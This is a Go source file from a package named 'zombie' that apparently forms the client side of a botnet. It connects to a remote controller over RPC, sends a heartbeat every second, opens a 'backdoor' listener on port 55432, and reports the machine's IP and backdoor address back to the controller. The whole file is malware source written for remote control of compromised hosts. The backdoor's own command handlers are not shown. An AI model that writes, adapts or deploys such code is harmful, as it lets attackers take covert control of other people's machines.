package zombie

import (
	"log"
	"net"
	"net/rpc"
	"time"

	"github.com/astaxie/beego/logs"
)

type Client struct {
	stopSign        chan int
	rpc             *rpc.Client
	args            *RpcArgs
	backDoorAddress chan string
}
type RpcArgs struct {
	Argu string
}

var err error

func NewClient(remoteAddress string) (client *Client) {
	client = new(Client)
	client.args = new(RpcArgs)
	client.backDoorAddress = make(chan string)
	client.stopSign = make(chan int)
	log.Println(remoteAddress)
	client.rpc, err = rpc.Dial("tcp", remoteAddress)
	if err != nil {
		log.Fatal(err)
	}
	return client
}

func (client *Client) Run() {
	go client.heartBeat(time.Second)
	go client.openBackDoor()
	go client.sendBackDoorAddress(<-client.backDoorAddress)
	<-client.stopSign
}

func (client *Client) sendBackDoorAddress(address string) {
	var reply *int
	client.args.Argu = address
	err = client.rpc.Call("HeaderReceiver.GetBackDoorAddress", client.args, &reply)
}

func (client *Client) openBackDoor() {

	listenerPort := ":55432"
	backDoorServer := new(BackDoorServer)
	backDoorServer.log = logs.NewLogger(100000)
	backDoorServer.log.SetLevel(log.Llongfile)
	backDoorServer.log.SetLogger("console", "")

	listener, e := net.Listen("tcp", listenerPort)

	if err != nil {
		log.Fatal(e)
	}
	backDoorServer.log.Info("opened the backdoor at %s", listener.Addr().String())
	backDoor := new(BackDoor)
	backDoor.Address = listener.Addr().String()
	if e != nil {
		log.Panicln("listen error:", e)
	}

	backDoorServer.Register(backDoor)

	localIp, err := GetIp()

	if err != nil {
		log.Fatal(err)
	}

	client.backDoorAddress <- localIp + listenerPort
	backDoorServer.Accept(listener)
}

func (client *Client) heartBeat(sec time.Duration) {
	for {
		var reply *int
		time1 := time.Now()
		err = client.rpc.Call("HeaderReceiver.HeartBeat", client.args, &reply)
		if err != nil {
			log.Println(err)
			log.Println("can't to connect to the host")
			client.stopSign <- 1
		}
		time2 := time.Now()
		diff := time2.Sub(time1)
		log.Println("Sending Heart Beat:", diff.String())
		<-time.Tick(1 * time.Second)
	}
}
